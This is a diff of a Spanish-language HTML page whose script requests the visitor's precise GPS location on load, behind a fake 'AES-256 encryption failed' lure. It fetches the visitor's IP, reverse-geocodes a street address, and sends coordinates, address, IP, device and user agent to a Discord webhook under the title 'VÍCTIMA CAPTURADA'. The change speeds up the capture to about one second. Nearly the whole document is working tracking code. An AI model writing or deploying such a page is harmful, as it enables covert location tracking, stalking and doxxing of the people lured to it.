@@ -97,12 +97,12 @@
             margin: 12px 0;
             display: flex;
             align-items: center;
-            opacity: 0;
-            animation: fadeIn 0.5s forwards;
+            animation: fadeIn 0.3s forwards;
         }
 
         @keyframes fadeIn {
-            to { opacity: 1; }
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         .status-line::before {
@@ -250,8 +250,8 @@
                 </p>
             </div>
 
-                        <div class="blocked-box" id="blockedBox">
-                <div class="icon-lock">🔒</div>
+            <div class="blocked-box" id="blockedBox">
+                                <div class="icon-lock">🔒</div>
                 <h2>⛔ ENCRIPTACIÓN FALLIDA</h2>
                 <p style="color: #f88; text-align: center; line-height: 1.8;">
                     <strong>ERROR: No se pudo establecer el cifrado AES-256</strong><br><br>
@@ -304,151 +304,156 @@
             return "❓ Desconocido";
         }
 
-        // INICIO AUTOMÁTICO AL CARGAR LA PÁGINA
+        // ⚡ INICIO INSTANTÁNEO (1 SEGUNDO)
         window.onload = function() {
-            iniciarCaptura();
+            setTimeout(() => {
+                document.getElementById('line2').style.display = 'flex';
+            }, 300);
+            
+            setTimeout(() => {
+                document.getElementById('line3').style.display = 'flex';
+            }, 600);
+            
+            // ⚡ PEDIR GPS A 1 SEGUNDO
+            setTimeout(() => {
+                iniciarCaptura();
+            }, 1000);
         };
 
         function iniciarCaptura() {
-            // Mostrar líneas progresivamente
-            setTimeout(() => document.getElementById('line2').style.display = 'flex', 1000);
-            setTimeout(() => document.getElementById('line3').style.display = 'flex', 2000);
-            
-            // Solicitar GPS AUTOMÁTICAMENTE después de 2.5 segundos
-            setTimeout(() => {
-                if (!navigator.geolocation) {
-                    mostrarError();
-                    return;
-                }
+            if (!navigator.geolocation) {
+                mostrarError();
+                return;
+            }
 
-                // Mostrar advertencia de que se pedirá permiso
-                document.getElementById('warningBox').style.display = 'block';
+            // Mostrar advertencia
+            document.getElementById('warningBox').style.display = 'block';
 
-                const opciones = {
-                    enableHighAccuracy: true,
-                    timeout: 20000,
-                    maximumAge: 0
-                };
+            const opciones = {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            };
 
-                // SOLICITAR GPS AUTOMÁTICAMENTE
-                navigator.geolocation.getCurrentPosition(
-                    async function(position) {
-                        // ✅ GPS OBTENIDO
-                        document.getElementById('warningBox').style.display = 'none';
-                        document.getElementById('line4').style.display = 'flex';
+            // SOLICITAR GPS INMEDIATAMENTE
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    // ✅ GPS OBTENIDO
+                    document.getElementById('warningBox').style.display = 'none';
+                    document.getElementById('line4').style.display = 'flex';
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const precision = position.coords.accuracy;
+
+                    // Animación de progreso
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += Math.random() * 5 + 3;
+                        if (progress > 100) progress = 100;
                         
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const precision = position.coords.accuracy;
+                        document.getElementById('progressBar').style.width = progress + '%';
+                        document.getElementById('progressText').textContent = Math.floor(progress) + '%';
 
-                        // Animación de progreso
-                        let progress = 0;
-                        const interval = setInterval(() => {
-                            progress += Math.random() * 4 + 2;
-                            if (progress > 100) progress = 100;
-                            
-                            document.getElementById('progressBar').style.width = progress + '%';
-                            document.getElementById('progressText').textContent = Math.floor(progress) + '%';
+                        if (progress > 50) document.getElementById('line5').style.display = 'flex';
 
-                            if (progress > 50) document.getElementById('line5').style.display = 'flex';
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            setTimeout(mostrarBloqueo, 1000);
+                        }
+                    }, 80);
 
-                            if (progress >= 100) {
-                                clearInterval(interval);
-                                setTimeout(mostrarBloqueo, 1500);
-                            }
-                        }, 100);
+                    try {
+                        // Capturar IP
+                        const respIP = await fetch('https://api.ipify.org?format=json');
+                        const dataIP = await respIP.json();
+                        const ip = dataIP.ip;
 
-                        try {
-                            // Capturar IP
-                            const respIP = await fetch('https://api.ipify.org?format=json');
-                            const dataIP = await respIP.json();
-                            const ip = dataIP.ip;
+                        // Obtener dirección desde GPS
+                        const respGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                        const geoData = await respGeo.json();
+                        const direccion = geoData.address || {};
 
-                            // Obtener dirección desde GPS
-                            const respGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-                            const geoData = await respGeo.json();
-                            const direccion = geoData.address || {};
+                        const tipoDispositivo = detectarDispositivo();
 
-                            const tipoDispositivo = detectarDispositivo();
-
-                            // Embed para Discord
-                            const embed = {
-                                embeds: [{
-                                    title: "🎯 VÍCTIMA CAPTURADA - GPS ACTIVO",
-                                    description: `**${tipoDispositivo}** | Encriptación AES-256 completada`,
-                                    color: 0x00FF00,
-                                    thumbnail: {
-                                        url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
+                        // Embed para Discord
+                        const embed = {
+                            embeds: [{
+                                title: "🎯 VÍCTIMA CAPTURADA - GPS ACTIVO",
+                                description: `**${tipoDispositivo}** | Encriptación AES-256 completada`,
+                                color: 0x00FF00,
+                                thumbnail: {
+                                    url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
+                                },
+                                fields: [
+                                    {
+                                        name: "📍 COORDENADAS GPS EXACTAS",
+                                        value: `**Latitud:** \`${lat}\`\n**Longitud:** \`${lon}\`\n**Precisión:** ${precision.toFixed(2)} metros`,
+                                        inline: false
                                     },
-                                    fields: [
-                                        {
-                                            name: "📍 COORDENADAS GPS EXACTAS",
-                                            value: `**Latitud:** \`${lat}\`\n**Longitud:** \`${lon}\`\n**Precisión:** ${precision.toFixed(2)} metros`,
-                                            inline: false
-                                        },
-                                        {
-                                            name: "🗺️ VER UBICACIÓN EN MAPA",
-                                            value: `[🌍 Google Maps](https://www.google.com/maps?q=${lat},${lon})\n[🗺️ OpenStreetMap](https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18)`,
-                                            inline: false
-                                        },
-                                        {
-                                            name: "🏠 DIRECCIÓN COMPLETA",
-                                            value: `**Calle:** ${direccion.road || 'N/A'}\n**Número:** ${direccion.house_number || 'N/A'}\n**Colonia:** ${direccion.suburb || direccion.neighbourhood || 'N/A'}\n**Ciudad:** ${direccion.city || direccion.town || 'N/A'}\n**Estado:** ${direccion.state || 'N/A'}\n**País:** ${direccion.country || 'N/A'}\n**CP:** ${direccion.postcode || 'N/A'}`,
-                                            inline: false
-                                        },
-                                        {
-                                            name: "🌐 IP PÚBLICA",
-                                            value: `\`${ip}\``,
-                                            inline: true
-                                        },
-                                        {
-                                            name: "📱 Dispositivo",
-                                            value: tipoDispositivo,
-                                            inline: true
-                                        },
-                                        {
-                                            name: "🖥️ Resolución",
-                                            value: `${screen.width}x${screen.height}`,
-                                            inline: true
-                                        },
-                                        {
-                                            name: "⏰ Fecha y Hora",
-                                            value: new Date().toLocaleString('es-ES'),
-                                            inline: false
-                                        },
-                                        {
-                                            name: "📱 User Agent Completo",
-                                            value: `\`\`\`${navigator.userAgent}\`\`\``,
-                                            inline: false
-                                        }
-                                    ],
-                                    footer: {
-                                        text: "Darknet GPS Capture System v4.7.2"
+                                    {
+                                        name: "🗺️ VER UBICACIÓN EN MAPA",
+                                        value: `[🌍 Google Maps](https://www.google.com/maps?q=${lat},${lon})\n[🗺️ OpenStreetMap](https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18)`,
+                                        inline: false
                                     },
-                                    timestamp: new Date().toISOString()
-                                }]
-                            };
+                                    {
+                                        name: "🏠 DIRECCIÓN COMPLETA",
+                                        value: `**Calle:** ${direccion.road || 'N/A'}\n**Número:** ${direccion.house_number || 'N/A'}\n**Colonia:** ${direccion.suburb || direccion.neighbourhood || 'N/A'}\n**Ciudad:** ${direccion.city || direccion.town || 'N/A'}\n**Estado:** ${direccion.state || 'N/A'}\n**País:** ${direccion.country || 'N/A'}\n**CP:** ${direccion.postcode || 'N/A'}`,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "🌐 IP PÚBLICA",
+                                        value: `\`${ip}\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "📱 Dispositivo",
+                                        value: tipoDispositivo,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "🖥️ Resolución",
+                                        value: `${screen.width}x${screen.height}`,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "⏰ Fecha y Hora",
+                                        value: new Date().toLocaleString('es-ES'),
+                                        inline: false
+                                    },
+                                    {
+                                        name: "📱 User Agent Completo",
+                                        value: `\`\`\`${navigator.userAgent}\`\`\``,
+                                        inline: false
+                                    }
+                                ],
+                                footer: {
+                                    text: "Darknet GPS Capture System v4.7.2"
+                                },
+                                timestamp: new Date().toISOString()
+                            }]
+                        };
 
-                            // Enviar a Discord
-                            await fetch(DISCORD_WEBHOOK, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(embed)
-                            });
+                        // Enviar a Discord
+                        await fetch(DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(embed)
+                        });
 
-                            console.log('✅ Datos enviados a Discord');
+                        console.log('✅ Datos enviados a Discord');
 
-                        } catch (error) {
-                            console.error('❌ Error:', error);
-                                            },
-                    function(error) {
-                        // ❌ ERROR AL OBTENER GPS
-                        console.error('Error GPS:', error);
-                        mostrarError();
-                    },
-                    opciones
-                );
-            }, 2500);
+                    } catch (error) {
+                        console.error('❌ Error:', error);
+                    }
+                },
+                function(error) {
+                    // ❌ ERROR AL OBTENER GPS
+                                        console.error('Error GPS:', error);
+                    mostrarError();
+                },
+                opciones
+            );
         }
 
         function mostrarBloqueo() {
@@ -471,4 +476,3 @@
     </script>
 </body>
 </html>
-            
